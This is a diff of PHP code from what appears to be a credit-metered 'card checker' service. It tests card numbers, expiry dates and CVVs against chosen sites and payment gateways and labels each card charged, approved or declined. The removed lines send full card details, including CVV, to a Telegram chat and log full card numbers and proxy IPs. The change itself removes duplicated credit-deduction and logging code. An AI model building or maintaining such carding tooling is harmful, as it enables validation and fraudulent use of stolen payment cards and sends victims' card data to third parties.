@@ -442,108 +442,6 @@ if (!empty($card) && !empty($site)) {
                 } else {
                     $response_data['warning'] = 'Check completed but credit deduction failed';
                 }
-            } 
-
-                // Telegram notification for all results (or charged-only based on config)
-                // Skip notifications for store blocking issues
-                $shouldAll = (bool) SiteConfig::get('notify_card_results', true);
-                $shouldCharged = (bool) SiteConfig::get('notify_card_charged', true);
-                $isStoreBlocked = ($status_message === 'STORE BLOCKED');
-                
-                if (function_exists('sendTelegramHtml') && !$isStoreBlocked && ($shouldAll || ($final_status_type === 'CHARGED' && $shouldCharged))) {
-                    $cc = $card_num;
-                    $mes = $month;
-                    $ano = $year;
-                    $cvv_show = $cvv;
-                $elapsed = round(microtime(true) - $start_time, 2);
-                $logo = ($final_status_type === 'CHARGED') ? '✅' : (($final_status_type === 'APPROVED') ? '🟢' : (($final_status_type === 'DECLINED') ? '❌' : '⚠️'));
-                $amount = $price;
-                $telegram_log_message = (
-                    "<b>Card Checked</b>\n\n" .
-                    "👤 <b>User ID:</b> {$telegram_id}\n" .
-                    "💳 <b>Card:</b> <code>{$cc}|{$mes}|{$ano}|{$cvv_show}</code>\n" .
-                    "🔗 <b>Site:</b> " . htmlspecialchars($site) . "\n" .
-                    "📣 <b>Response:</b> " . htmlspecialchars($status_message) . "\n" .
-                    "🟩 <b>Status:</b> " . htmlspecialchars($final_status_type) . " {$logo}\n" .
-                    "🏦 <b>Gateway:</b> " . htmlspecialchars($gateway) . "\n" .
-                    "💵 <b>Amount:</b> " . htmlspecialchars($amount) . "\n" .
-                    "⏱️ <b>Time:</b> {$elapsed}s"
-                );
-                sendTelegramHtml($telegram_log_message);
-            }
-
-            // Deduct 1 credit for the check (charge regardless of result)
-            $credit_deducted = $db->deductCredits($telegram_id, 1);
-            if ($credit_deducted) {
-                $response_data['credits_deducted'] = 1;
-                // Optionally refresh to get accurate remaining balance under concurrency
-                try {
-                    $freshUser = $db->getUserByTelegramId($telegram_id);
-                    $response_data['remaining_credits'] = intval($freshUser['credits'] ?? ($current_credits - 1));
-                } catch (Exception $e) {
-                    $response_data['remaining_credits'] = $current_credits - 1;
-                }
-                
-                // Send owner notification for card check activity
-                try {
-                    $ownerLogger = new OwnerLogger();
-                    $ownerLogger->sendUserActivity(
-                        $user,
-                        'Card Check',
-                        "Card: " . substr($card, 0, 8) . "****|**|**|*** on " . parse_url($site, PHP_URL_HOST) . " - Result: " . $final_status_type
-                    );
-                } catch (Exception $e) {
-                    error_log("Owner logging failed: " . $e->getMessage());
-                }
-                
-                // Log CC check to database
-                try {
-                    $ccLogger = new CCLogsManager();
-                    $statusForLog = strtolower($final_status_type) === 'approved' ? 'live' : strtolower($final_status_type);
-                    $ccLogger->logCCCheck([
-                        'telegram_id' => $telegram_id,
-                        'username' => $user['username'] ?? 'Unknown',
-                        'card_number' => $card,
-                        'card_full' => $card,
-                        'status' => $statusForLog,
-                        'message' => $status_message,
-                        'gateway' => $gateway,
-                        'amount' => $price,
-                        'proxy_status' => $proxy_status,
-                        'proxy_ip' => $proxy_ip
-                    ]);
-                } catch (Exception $e) {
-                    error_log("CC logging failed: " . $e->getMessage());
-                }
-                
-                // Log CC check to database
-                try {
-                    $ccLogger = new CCLogsManager();
-                    $statusForLog = strtolower($final_status_type) === 'approved' ? 'live' : strtolower($final_status_type);
-                    $ccLogger->logCCCheck([
-                        'telegram_id' => $telegram_id,
-                        'username' => $user['username'] ?? 'Unknown',
-                        'card_number' => $card,
-                        'card_full' => $card,
-                        'status' => $statusForLog,
-                        'message' => $status_message,
-                        'gateway' => $gateway,
-                        'amount_charged' => ($final_status_type === 'CHARGED') ? floatval($price) : 0,
-                        'currency' => 'USD'
-                    ]);
-                } catch (Exception $e) {
-                    error_log("Failed to log CC check: " . $e->getMessage());
-                }
-                // Log tool usage (count=1, creditsUsed=1)
-                try {
-                    if (method_exists($db, 'logToolUsage')) {
-                        $db->logToolUsage($telegram_id, 'card_checker', 1, 1);
-                    }
-                } catch (Exception $e) {
-                    error_log("Failed to log tool usage: " . $e->getMessage());
-                }
-            } else {
-                $response_data['warning'] = 'Check completed but credit deduction failed';
             }
 
         } else {
@@ -662,34 +560,8 @@ if (!empty($card) && !empty($site)) {
     $response_data['ui_status_type'] = 'API_ERROR';
 }
 
-// Deduct 1 credit for any check attempt (regardless of result)
-if ($is_valid_card && $is_valid_site) {
-    $credit_deducted = $db->deductCredits($telegram_id, 1);
-    if ($credit_deducted) {
-        $response_data['credits_deducted'] = 1;
-        // Refresh user data to get accurate remaining balance
-        try {
-            $freshUser = $db->getUserByTelegramId($telegram_id);
-            $response_data['remaining_credits'] = intval($freshUser['credits'] ?? ($current_credits - 1));
-        } catch (Exception $e) {
-            $response_data['remaining_credits'] = $current_credits - 1;
-        }
-        
-        // Send owner notification for card check activity
-        try {
-            $ownerLogger = new OwnerLogger();
-            $ownerLogger->sendUserActivity(
-                $user,
-                'Card Check',
-                "Card: " . substr($card, 0, 8) . "****|**|**|*** on " . parse_url($site, PHP_URL_HOST) . " - Result: " . ($response_data['status'] ?? 'Unknown')
-            );
-        } catch (Exception $e) {
-            error_log("Owner logging failed: " . $e->getMessage());
-        }
-    } else {
-        $response_data['warning'] = 'Check completed but credit deduction failed';
-    }
-}
+// Credit deduction is handled above in the successful API response section
+// Only deduct credits once per check
 
 $end_time = microtime(true);
 $total_time_ms = round(($end_time - $start_time) * 1000, 2);
